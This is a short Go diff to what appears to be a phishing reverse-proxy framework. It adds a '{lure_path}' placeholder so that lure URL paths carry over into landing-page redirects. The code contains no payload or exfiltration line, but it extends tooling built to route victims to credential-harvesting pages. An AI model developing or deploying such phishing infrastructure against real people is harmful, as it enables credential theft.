@@ -717,7 +717,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if l.Redirector == "" {
 										var redir_url string
 										if l.LandingUrl != "" {
-											redir_url = p.buildLureLandingUrl(l.LandingUrl, pl)
+											redir_url = p.buildLureLandingUrl(l.LandingUrl, req.URL.Path, pl)
 											log.Debug("[%d] [%s] landing redirect: buildLureLandingUrl(%q) -> %q", sid, hiblue.Sprint(pl_name), l.LandingUrl, redir_url)
 										} else if l.Hostname != "" && strings.EqualFold(l.Hostname, req.Host) {
 											redir_url = p.buildPhishletLoginUrl(pl)
@@ -953,7 +953,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						var rurl string
 						var target_host string
 						if l.LandingUrl != "" {
-							rurl = p.buildLureLandingUrl(l.LandingUrl, pl)
+							rurl = p.buildLureLandingUrl(l.LandingUrl, req_path, pl)
 							log.Debug("[%d] [%s] triggered lure path redirect: landing_url -> %q", ps.Index, hiblue.Sprint(pl_name), rurl)
 						}
 						if rurl == "" {
@@ -2997,12 +2997,15 @@ func (p *HttpProxy) buildPhishletLoginUrl(pl *Phishlet) string {
 	return redir_url
 }
 
-func (p *HttpProxy) buildLureLandingUrl(landingUrl string, pl *Phishlet) string {
+func (p *HttpProxy) buildLureLandingUrl(landingUrl string, reqPath string, pl *Phishlet) string {
 	landing_host := pl.GetLandingPhishHost()
 	if landing_host == "" {
 		log.Debug("buildLureLandingUrl: empty landing host for phishlet %s", pl.Name)
 		return ""
 	}
+
+	// support {lure_path} placeholder to reuse the incoming lure URL path
+	landingUrl = strings.Replace(landingUrl, "{lure_path}", reqPath, -1)
 
 	lu, err := url.Parse(landingUrl)
 	if err != nil {
